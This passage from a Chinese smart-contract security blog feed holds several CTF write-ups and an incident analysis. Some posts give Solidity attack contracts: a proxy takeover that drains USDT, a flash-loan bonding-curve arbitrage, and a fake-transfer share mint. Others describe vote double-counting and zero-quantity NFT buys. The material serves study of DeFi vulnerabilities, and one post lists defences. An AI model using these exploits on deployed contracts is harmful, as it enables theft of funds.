class="line">    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);</span><br><span class="line">    bytes32 constant solt = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function exploit() public&#123;</span><br><span class="line">        cexiswap.initialize(</span><br><span class="line">            &quot;HAX&quot;,</span><br><span class="line">            &quot;HAX&quot;,</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this));</span><br><span class="line">        </span><br><span class="line">        cexiswap.upgradeToAndCall( address(this),abi.encodePacked(this.exploit2.selector));</span><br><span class="line"></span><br><span class="line">        this.killMe();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit2() public&#123;</span><br><span class="line">        owner = address(this);</span><br><span class="line">        </span><br><span class="line">        usdt.transfer(owner, usdt.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      function upgradeTo(address newImplementation) external &#123;</span><br><span class="line">        bytes32 _slot = solt;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(_slot, newImplementation)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function killMe() public&#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-bonding-curve</title>
      <link href="/2024/10/27/CTF-bonding-curve/"/>
      <url>/2024/10/27/CTF-bonding-curve/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-bonding-curve"><a href="#CTF-bonding-curve" class="headerlink" title="CTF-bonding-curve"></a>CTF-bonding-curve</h1><p>题目码源：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/bonding-curve">点击</a></p><p>题目要求：<br>他们即将推出的游戏发布了两个代币合同：EMN和TOKEN，它们允许你根据各自的粘合曲线进行铸造。</p><p>DAI 用于铸造 EMN，EMN 用于铸造 TOKEN。</p><p>您的任务是窃取至少 50,000 个 DAI。您开始时没有token。</p><p>这次感觉后面的题目就上难度了，粘合曲线就是一个新知识了。</p><p>首先这个合约这个合约有点多，慢慢来分析，<code>BancorBondingCurve</code>合约实现了一个关键的债务曲线，数学知识很多，了解就行。<code>EminenceCurrency</code>合约实现了EMN-&gt;TOkEN，买入token,消耗EMN。<code>EminenceCurrencyBase</code>合约实现了DAI-&gt;EMN,买入EMN，消耗DAI，<code>EminenceCurrencyHepler</code>合约，就是对债务曲线的实现。</p><p>梳理完后，就是要获得DAI代币，而我们又没有钱，所以就只能借，那就是闪电贷的实现，这道题很容易想到套利，那么如何在买卖中获得利润，就是我们要实现了的</p><p>在<code>EminenceCurrencyBase</code>合约看到买EMN的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">function buy(uint _amount, uint _min) external returns (uint _bought) &#123;</span><br><span class="line">    _bought = _buy(_amount);</span><br><span class="line">    require(_bought &gt;= _min, &quot;slippage&quot;);</span><br><span class="line">    DAI.transferFrom(msg.sender, address(this), _amount);</span><br><span class="line">    _mint(msg.sender, _bought);</span><br><span class="line">    emit CashShopBuy(msg.sender, _bought, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来很正常<br>但是看向<code>EminenceCurrency</code>合约中买token的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claim(address _from, uint _amount) external &#123;</span><br><span class="line">       require(gamemasters[msg.sender]||npcs[msg.sender], &quot;!gm&quot;);</span><br><span class="line">       _burn(_from, _amount);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function buy(uint _amount, uint _min) external returns (uint _bought) &#123;</span><br><span class="line">       _bought = _buy(_amount);</span><br><span class="line">       require(_bought &gt;= _min, &quot;slippage&quot;);</span><br><span class="line">       EMN.claim(msg.sender, _amount);</span><br><span class="line">       _mint(msg.sender, _bought);</span><br><span class="line">       emit CashShopBuy(msg.sender, _bought, _amount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>发现还是有点区别的，一个是实现DAI的转账，一个是实现EMN的销毁，那么自身的EMN销毁后，对于债务曲线还是有影响的。<br>所以一个套利思路就有了：首先使用闪电贷，借入DAI，然后用全部的DAI购买EMN，再在闪电贷执行回调函数的函数的时候，拿出一部分的EMN进行购买token,这样市场的EMN就会被销毁，那么就影响到了此时的EMN的价格，然后在通过swap把token交换成EMN，我们在进行高价出售EMN，就能获得更多的DAI，然后还钱，剩下的DAI就归我们所有。</p><p>攻击合约如下：</p><pre><code>//SPDX-License-Identifier:MITpragma solidity ^0.8.17;//因为需要闪电贷，使用unisawpV2来进行interface IUinswapV2Pair&#123;  function swap(uint amount0,uint amoun2,address to,bytes calldata data) exteranl;&#125;interface IEminceCurrency&#123;    function buy(uint _amount, uint _min) external returns (uint _bought);     function sell(uint _amount, uint _min) external returns (uint _bought) ;&#125;interface TokenERC20&#123;  function balanceOf(address token) exteranl ; function approve(address spender, uint256 amount) external ;&#125;contract Hack&#123;    IUniswapV2Pair pair;    IEminceCurrency buyemn;    IEminceCurrency buytoken;    TokenERC20 dai     constructor(address _pair,address _buyemn;address buytoken,address _dai)    &#123;        pair = IUniswapV2Pair(_pair);        buyemn = IEminceCurrency(_buyemn);        buytoken = IEminceCurrency(_buytoken);        dai = TokenERC20(_dai);    &#125;   function pwn (uint256 amount) exteranl &#123;    pair.swap(0,amount,address(this),bytes())   &#125;   function uiswapV2call (address _sender,uint256 amount0,uint256 amount1,bytes calldata _data) exteranl &#123;        uint256 daiamount =dai.balanceOf(address(this));        dai.approve(address(buyemn),type.(uint256).max);        dai.approve(address(buytoken),type(uint256).max);         //买入EMN；        uint256 buy1amount = buyemn.buy(daiamount,0);        //用1/2的EMN，买入token，此时会销毁EMN，导致EMN的价格额升高        uint256 buy2amount = buytoken.buy(buy1amount/2,0);        //出售EMN        uint256 sell1amount = buyemn.sell(buy1amount/2,0);        //出售token获得EMN        uint256 sell2amount = buytoken.sell(buy2amount,0);        //出售剩下的EMN        uint256 sell3amount = buyemn.sell(sell2amount,0);        uint256 daitotal = sell1amount + sell3amount;        //还本金加利息        uint256 returnamount = (amount1*(10**18)*1000/997/(10**18))+1;        dai.transfer (msg.sender,returnamount);        //将剩下的dai发送给我们自己        dai.transfer(tx.origin,(daitotal-returnamount));   &#125;&#125;完结，个人认为，就是首先，要想到使用闪电贷，使用套利，发现漏洞的存在。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-governance-shenamigans</title>
      <link href="/2024/10/25/CTF-governance-shenamigans/"/>
      <url>/2024/10/25/CTF-governance-shenamigans/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-governance-shenamigans"><a href="#CTF-governance-shenamigans" class="headerlink" title="CTF-governance-shenamigans"></a>CTF-governance-shenamigans</h1><p>题目源码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/governance-shenanigans">点击</a></p><p>要求是;<br>NotSushiToken 治理代币合约已经上线，旨在决定谁是最佳寿司厨师。谁不想要这样的荣耀呢？<br>该合约只允许 WLed 地址投票。幸运的是，你的 Sybil 攻击让你获得了 3 个可以投票的 WLed 地址。<br>你的目标是获得最多的委托投票，成为真正的寿司之王。你手中有 500 个代币，而你的竞争对手有 2000 个。</p><p>从题目中就可以得到一点方向，就是有3个可以投票的地址，说明我们肯定要运用起来</p><p>整个合约的逻辑就是委托投票，那么如果，我们将原有的500 个代币，委托给那3个地址，给我们投票，那么我们不就有很多票了吗</p><p>看向代码，允许我们这么做吗</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _delegate(address delegator, address delegatee)</span><br><span class="line">       internal</span><br><span class="line">   &#123;</span><br><span class="line">       address currentDelegate = _delegates[delegator];</span><br><span class="line">       uint256 delegatorBalance = balanceOf(delegator); // balance of underlying SUSHIs (not scaled);</span><br><span class="line">       _delegates[delegator] = delegatee;</span><br><span class="line"></span><br><span class="line">       emit DelegateChanged(delegator, currentDelegate, delegatee);</span><br><span class="line"></span><br><span class="line">       _moveDelegates(currentDelegate, delegatee, delegatorBalance);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /// @dev votes are transfered from delegatee `srcRep` to `dstRep`</span><br><span class="line">   function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal &#123;</span><br><span class="line">       if (srcRep != dstRep &amp;&amp; amount &gt; 0) &#123;</span><br><span class="line">           if (srcRep != address(0)) &#123;</span><br><span class="line">               // decrease old representative</span><br><span class="line">               uint32 srcRepNum = numCheckpoints[srcRep];</span><br><span class="line">               uint256 srcRepOld = srcRepNum &gt; 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;</span><br><span class="line">               uint256 srcRepNew = srcRepOld.sub(amount);</span><br><span class="line">               _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           if (dstRep != address(0)) &#123;</span><br><span class="line">               // increase new representative</span><br><span class="line">               uint32 dstRepNum = numCheckpoints[dstRep];</span><br><span class="line">               uint256 dstRepOld = dstRepNum &gt; 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;</span><br><span class="line">               uint256 dstRepNew = dstRepOld.add(amount);</span><br><span class="line">               _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>发现没有什么限制，就能更新 <code>_delegates[delegator] = delegatee</code> 代表者,  也就是说刚刚那个想法就可实现</p><p>攻击思路：<br>三个地址，attracker,B,C,<br>attracter发送500代币给B，B在委托给attracker,  此时attracker的投票数500；<br>B将500代币发送给C，C在委托给attracker,此此时attrcaker的投票数为1000；<br>C将500代币发送给attracker,attracker在再重复前面的工作，直至投票数超过2000；</p><p>个人认为,这个合约漏洞是，可以随意更新代表者，并且委托人的token会留在它自己这儿，就好像双花一样，代币被重复使用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-MasterChef</title>
      <link href="/2024/10/25/CTF-MasterChef/"/>
      <url>/2024/10/25/CTF-MasterChef/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-MasterChef"><a href="#CTF-MasterChef" class="headerlink" title="CTF-MasterChef"></a>CTF-MasterChef</h1><p>题目源码;<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/inflationary-net-worth">点击</a></p><p>要求是：<br>有一个 MasterChef 合约，它接受 MULA 代币并向质押者铸造 MUNY 作为奖励。</p><p>MULA 具有通缩转账税机制，每次转账会销毁 5% 的数量，以有效激励长期持有者。</p><p>你的任务是欺骗 MasterChef，使其为你铸造分配给所有质押者的所有 MUNY。你开始时拥有 10,000 MULA。</p><p>看到有源代码，和之前的质押合约很像，存款获得奖励，而我们就是要获得这个MdsterChef合约中全部的奖励，看到题目说有5%的手续费，初步想法就是会不会是溢出啥的，但是看到存取代码时，我并没有看见有对5%的手续费的说明</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//_pid是流动池的ID</span><br><span class="line"> function deposit(uint256 _pid, uint256 _amount) public &#123;</span><br><span class="line">        PoolInfo storage pool = poolInfo[_pid];</span><br><span class="line">        UserInfo storage user = userInfo[_pid][msg.sender];</span><br><span class="line">        updatePool(_pid);</span><br><span class="line">        if (user.amount &gt; 0) &#123;</span><br><span class="line">            uint256 pending =</span><br><span class="line">                user.amount.mul(pool.accMunyPerShare).div(1e12).sub(</span><br><span class="line">                    user.rewardDebt</span><br><span class="line">                );</span><br><span class="line">            safeMunyTransfer(msg.sender, pending);</span><br><span class="line">        &#125;</span><br><span class="line">        pool.lpToken.safeTransferFrom(</span><br><span class="line">            address(msg.sender),</span><br><span class="line">            address(this),</span><br><span class="line">            _amount</span><br><span class="line">        );</span><br><span class="line">        user.amount = user.amount.add(_amount);</span><br><span class="line">        user.rewardDebt = user.amount.mul(pool.accMunyPerShare).div(1e12);</span><br><span class="line">        emit Deposit(msg.sender, _pid, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Withdraw LP tokens from MasterChef.</span><br><span class="line">    function withdraw(uint256 _pid, uint256 _amount) public &#123;</span><br><span class="line">        PoolInfo storage pool = poolInfo[_pid];</span><br><span class="line">        UserInfo storage user = userInfo[_pid][msg.sender];</span><br><span class="line">        require(user.amount &gt;= _amount, &quot;withdraw: not good&quot;);</span><br><span class="line">        updatePool(_pid);</span><br><span class="line">        uint256 pending =</span><br><span class="line">            user.amount.mul(pool.accMunyPerShare).div(1e12).sub(</span><br><span class="line">                user.rewardDebt</span><br><span class="line">            );</span><br><span class="line">        safeMunyTransfer(msg.sender, pending);</span><br><span class="line">        user.amount = user.amount.sub(_amount);</span><br><span class="line">        user.rewardDebt = user.amount.mul(pool.accMunyPerShare).div(1e12);</span><br><span class="line">        pool.lpToken.safeTransfer(address(msg.sender), _amount);</span><br><span class="line">        emit Withdraw(msg.sender, _pid, _amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么是不是就可以执行循环存取款，（题目也说了我们有10,000 MULA），获得奖励</p><p>攻击思路：就是通过循环存取款，获得奖励（注意，因为MulaToken合约中有自带的损失5%，所以最后攻击者还是的损失代币，不过是题目初始的，并不用担心）</p><p>其他的不用去纠结那么多，就是考察这个货币有没有通货紧缩代币支持</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC721</title>
      <link href="/2024/10/25/ERC721/"/>
      <url>/2024/10/25/ERC721/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h1><p>非同质代币标准</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>非同质化代币（NFT）用于以唯一的方式标识某人或者某物。 此类型的代币可以被完美地用于出售下列物品的平台：收藏品、密钥、彩票、音乐会座位编号、体育比赛等。 这种类型的代币有着惊人的潜力，因此它需要一个适当的标准。ERC-721 就是为解决这个问题而来！</p><p>ERC-721 为 NFT 引入了一个标准，换言之，这种类型的代币是独一无二的，并且可能与来自同一智能合约的另一代币有不同的价值，也许是因为它的年份、稀有性、甚至是它的观感。</p><p>是的。 所有 NFTs 都有一个 uint256 变量，名为 tokenId，所以对于任何 ERC-721 合约，这对值contract address, tokenId 必须是全局唯一的。 也就是说，去中心化应用程序可以有一个“转换器”， 使用 tokenId 作为输入并输出一些很酷的事物图像，例如僵尸、武器、技能或神奇的小猫咪！</p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><p>协议函数如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function balanceOf(address _owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">function ownerOf(uint256 _tokenId) external view returns (address);</span><br><span class="line">//注意发送的tokenid，没有数量</span><br><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;</span><br><span class="line"></span><br><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line"></span><br><span class="line">function transferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line"></span><br><span class="line">function approve(address _approved, uint256 _tokenId) external payable;</span><br><span class="line"></span><br><span class="line">function setApprovalForAll(address _operator, bool _approved) external;</span><br><span class="line"></span><br><span class="line">function getApproved(uint256 _tokenId) external view returns (address);</span><br><span class="line"></span><br><span class="line">function isApprovedForAll(address _owner, address _operator) external view returns (bool);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>说明：<br>balanceOf(): 返回由_owner 持有的NFTs的数量。</p><p>ownerOf(): 返回tokenId代币持有者的地址。</p><p>approve(): 授予地址_to具有_tokenId的控制权，方法成功后需触发Approval 事件。</p><p>setApprovalForAll(): 授予地址_operator具有所有NFTs的控制权，成功后需触发ApprovalForAll事件。</p><p>getApproved()、isApprovedForAll(): 用来查询授权。</p><p>safeTransferFrom(): 转移NFT所有权，一次成功的转移操作必须发起 Transer 事件。函数的实现需要做一下几种检查：</p><ul><li>调用者msg.sender应该是当前tokenId的所有者或被授权的地址</li><li>_from 必须是 _tokenId的所有者</li><li>_tokenId 应该是当前合约正在监测的NFTs 中的任何一个</li><li>_to 地址不应该为 0，如果_to 是一个合约应该调用其onERC721Received方法, 并且检查其返回值，如果返回值不为bytes4(keccak256(“onERC721Received(address,uint256,bytes)”))抛出异常。<br>一个可接收NFT的合约必须实现ERC721TokenReceiver接口：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface ERC721TokenReceiver &#123;</span><br><span class="line">    /// @return `bytes4(keccak256(&quot;onERC721Received(address,uint256,bytes)&quot;))`</span><br><span class="line">    function onERC721Received(address _from, uint256 _tokenId, bytes data) external returns(bytes4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>transferFrom(): 用来转移NFTs, 方法成功后需触发Transfer事件。调用者自己确认_to地址能正常接收NFT，否则将丢失此NFT。此函数实现时需要检查上面条件的前4条。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-nft-bonanza</title>
      <link href="/2024/10/25/CTF-nft-bonanza/"/>
      <url>/2024/10/25/CTF-nft-bonanza/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-ntf-bonanza"><a href="#CTF-ntf-bonanza" class="headerlink" title="CTF-ntf-bonanza"></a>CTF-ntf-bonanza</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/nft-bonanza">点击</a></p><p>要求是：新的 NFT 交易合约 BonanzaMarketplace 已经推出，它允许交易选定的白名单 ERC721 和 ERC1155 代币。您的挑战是获得所有列出的 NFT。</p><p>根据源码，可以发现此时的NTF都是ERC721代币，所以了解ERC721非同质化代币标准，会很好的理解。</p><p>要获得所列的NTF，就先看看，buyItem函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buyItem(</span><br><span class="line">       address _nftAddress,</span><br><span class="line">       uint256 _tokenId,</span><br><span class="line">       address _owner,</span><br><span class="line">       uint256 _quantity</span><br><span class="line">   )</span><br><span class="line">       external</span><br><span class="line">       nonReentrant</span><br><span class="line">       isListed(_nftAddress, _tokenId, _owner)</span><br><span class="line">       validListing(_nftAddress, _tokenId, _owner)</span><br><span class="line">   &#123;</span><br><span class="line">       require(_msgSender() != _owner, &quot;Cannot buy your own item&quot;);</span><br><span class="line"></span><br><span class="line">       Listing memory listedItem = listings[_nftAddress][_tokenId][_owner];</span><br><span class="line">       require(listedItem.quantity &gt;= _quantity, &quot;not enough quantity&quot;);</span><br><span class="line"></span><br><span class="line">       // Transfer NFT to buyer</span><br><span class="line">       if (IERC165(_nftAddress).supportsInterface(INTERFACE_ID_ERC721)) &#123;</span><br><span class="line">           IERC721(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           IERC1155(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId, _quantity, bytes(&quot;&quot;));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (listedItem.quantity == _quantity) &#123;</span><br><span class="line">           delete (listings[_nftAddress][_tokenId][_owner]);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           listings[_nftAddress][_tokenId][_owner].quantity -= _quantity;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       emit ItemSold(</span><br><span class="line">           _owner,</span><br><span class="line">           _msgSender(),</span><br><span class="line">           _nftAddress,</span><br><span class="line">           _tokenId,</span><br><span class="line">           _quantity,</span><br><span class="line">           listedItem.pricePerItem</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       _buyItem(listedItem.pricePerItem, _quantity, _owner);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function _buyItem(</span><br><span class="line">       uint256 _pricePerItem,</span><br><span class="line">       uint256 _quantity,</span><br><span class="line">       address _owner</span><br><span class="line">   ) internal &#123;</span><br><span class="line">       uint256 totalPrice = _pricePerItem * _quantity;</span><br><span class="line">       uint256 feeAmount = totalPrice * fee / BASIS_POINTS;</span><br><span class="line">       IERC20(paymentToken).safeTransferFrom(_msgSender(), feeReceipient, feeAmount);</span><br><span class="line">       IERC20(paymentToken).safeTransferFrom(_msgSender(), _owner, totalPrice - feeAmount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>从上我们可以看到，并没有对购买数量quantity的检查，所以即使购买零个NTF也是可以的，重点来了，在ERC721代币标准中，对于购买数量并没有要求，还是会发送tokenId给购买者，这就是漏洞所在</p><p>攻击思路：直接调用buyItem函数，购买零个ERC721代币标准的NTF就可以了</p><p>个人认为，这个题就是疏忽了ERC721代币的执行标准，所以对于一些主流协议，还是必须的了解。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可怕的外部调用？</title>
      <link href="/2024/10/25/%E5%8F%AF%E6%80%95%E7%9A%84%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%EF%BC%9F/"/>
      <url>/2024/10/25/%E5%8F%AF%E6%80%95%E7%9A%84%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>往往对于一个功能成熟的<code>DAPP</code>，如uniswapV2,多签钱包等，都是通过多个智能合约实现的，那么就多多少少都会涉及到外部的调用，然而这就带来的很大的风险。如果不能确保外部调用的合约是正常且不带恶意逻辑代码，那么对自身合约就是个定时炸弹，不知道哪天就调用了一个不正常的恶意合约，引爆炸弹。</p><p>外部调用会引发的一些常见漏洞：重入攻击，外部合约的安全性问题，重放攻击等</p><p>具体来看一下代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deposit(</span><br><span class="line">       uint256 farmDeposit,</span><br><span class="line">       address payable from,</span><br><span class="line">       address to</span><br><span class="line">   ) external returns (uint256 shares) &#123;</span><br><span class="line">       require(farmDeposit &gt; 0, &quot;deposits must be nonzero&quot;);</span><br><span class="line">       require(to != address(0) &amp;&amp; to != address(this), &quot;to&quot;);</span><br><span class="line">       require(from != address(0) &amp;&amp; from != address(this), &quot;from&quot;);</span><br><span class="line"></span><br><span class="line">       shares = farmDeposit;</span><br><span class="line">       if (xfarm.totalSupply() != 0) &#123;</span><br><span class="line">           uint256 farmBalance = farm.balanceOf(address(this));</span><br><span class="line">           shares = (shares * xfarm.totalSupply()) / farmBalance;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (isContract(from)) &#123;</span><br><span class="line">           require(IAdvisor(from).owner() == msg.sender); // admin</span><br><span class="line">           IAdvisor(from).delegatedTransferERC20(address(farm), address(this), farmDeposit);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           require(from == msg.sender); // user</span><br><span class="line">           farm.safeTransferFrom(from, address(this), farmDeposit);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       xfarm.mint(to, shares);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这是一个质押合约 RewardsAdvisor中的部分代码，它接受 FARM 代币并铸造等量的 xFARM。xFARM 用于治理defi 生态系统。<br>通过以上代码。我们发现当质押合约接受xFARM时，如果对面是合约A，不是外部账户，那么质押合约就会调用这个合约A的delegatedTransferERC20，来进行代币的转移，可是，质押合约并没有对转移后代币数量的检查等，所以，合约A中delegatedTransferERC20函数如果什么也没有实现，质押合约也会认为代币接受成功了，这将会引起一个可怕的后果。</p><p>同样。也有以下代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function stakeFor(address _for, uint256 _amount) public &#123;</span><br><span class="line">    require(_amount &gt; 0, &quot;Cannot stake 0&quot;);</span><br><span class="line">    </span><br><span class="line">    // pull tokens and apply stake</span><br><span class="line">    stakingToken.safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">    _applyStake(_for, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是一个质押合约中的部分代码，进行外部调用  <code>stakingToken.safeTransferFrom(msg.sender, address(this))</code>,都是没有对调用后进行一个检查，攻击者就可以乘虚而入，如：TempleDAO 的 STAX 在2022年就因为同样的原因被黑客入侵，损失了价值约 $2.3M 的 LP 代币。再者就是Visor合约(实现铸造无限奖励)，黑客通过利用同样的原理实现了经济套利，铸造了 195k 个 vVISR 代币。然后，这些被<code>burn</code>为 8.8M VISR，通过 Uniswap v2 交换为 ETH，获得了113 ETH（450 美元）。<a href="https://rekt.news/templedao-rekt/">案例1参考</a> <a href="https://rekt.news/visor-finance-rekt/">案例2参考</a></p><p>但是，外部调用并不可怕，您可以通过以下措施来防范：<br>1，使用状态变量控制，在执行外部调用之前先更新合约状态，防止重入攻击。<br>2，采用检查-效果-交互模式，将合约操作分为三个阶段，确保在外部调用前完成所有状态更新。<br>3，实现重入保护，使用互斥锁（例如 nonReentrant 修饰符）来防止重入攻击。<br>4，通过权限控制，确保只有经过授权的用户可以执行特定操作，使用 Ownable 或类似的库来管理权限。<br>5，使用受信任的外部合约，在与其他合约交互时，确保只与信誉良好的合约交互，避免不必要的风险。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-freebie</title>
      <link href="/2024/10/24/CTF-freebie/"/>
      <url>/2024/10/24/CTF-freebie/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-freebie"><a href="#CTF-freebie" class="headerlink" title="CTF-freebie"></a>CTF-freebie</h1><p> 题目源码<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/freebie">点击</a></p><p> 这道题，怎么说，和昨天写的那个<a href="CTF-tasty-stake.md">CTF-tasty-stake</a>的漏洞原理一样</p><p> 看到这段代码，经典的委托调用，只不过这次又是不实现它</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deposit(</span><br><span class="line">        uint256 farmDeposit,</span><br><span class="line">        address payable from,</span><br><span class="line">        address to</span><br><span class="line">    ) external returns (uint256 shares) &#123;</span><br><span class="line">        require(farmDeposit &gt; 0, &quot;deposits must be nonzero&quot;);</span><br><span class="line">        require(to != address(0) &amp;&amp; to != address(this), &quot;to&quot;);</span><br><span class="line">        require(from != address(0) &amp;&amp; from != address(this), &quot;from&quot;);</span><br><span class="line"></span><br><span class="line">        shares = farmDeposit;</span><br><span class="line">        if (xfarm.totalSupply() != 0) &#123;</span><br><span class="line">            uint256 farmBalance = farm.balanceOf(address(this));</span><br><span class="line">            shares = (shares * xfarm.totalSupply()) / farmBalance;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (isContract(from)) &#123;</span><br><span class="line">            require(IAdvisor(from).owner() == msg.sender); // admin</span><br><span class="line">            IAdvisor(from).delegatedTransferERC20(address(farm), address(this), farmDeposit);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            require(from == msg.sender); // user</span><br><span class="line">            farm.safeTransferFrom(from, address(this), farmDeposit);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        xfarm.mint(to, shares);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个函数实现的是存款合约，存入代币后，就可以获得股份，存入越多，获得的就越多。</p><p>然而又是一个对外部调用，没有检查。</p><p>攻击合约如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IRewardsAdvisor &#123;</span><br><span class="line">    function withdraw(</span><br><span class="line">        uint256 shares,</span><br><span class="line">        address to,</span><br><span class="line">        address payable from</span><br><span class="line">    ) external returns (uint256 rewards);</span><br><span class="line"></span><br><span class="line">    function deposit(</span><br><span class="line">        uint256 farmDeposit,</span><br><span class="line">        address payable from,</span><br><span class="line">        address to</span><br><span class="line">    ) external returns (uint256 shares);</span><br><span class="line">&#125;</span><br><span class="line">contract Hack&#123;</span><br><span class="line"></span><br><span class="line">    IRewardsAdvisor rewardsAdvisor;</span><br><span class="line"></span><br><span class="line">    constructor(address _rewardsAdvisor) &#123;</span><br><span class="line">        rewardsAdvisor = IRewardsAdvisor(_rewardsAdvisor);</span><br><span class="line">    &#125;</span><br><span class="line">  //不实现这个功能--欺骗</span><br><span class="line">    function delegatedTransferERC20(address token, address to, uint256 amount) external &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function runExploit() external &#123;</span><br><span class="line">        uint256 depositAmount = 1e18 * 1e18; //大量的FARM</span><br><span class="line">        uint256 shares = rewardsAdvisor.deposit(depositAmount, payable(address(this)), address(this));</span><br><span class="line"></span><br><span class="line">        rewardsAdvisor.withdraw(shares, msg.sender, payable(address(this))); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 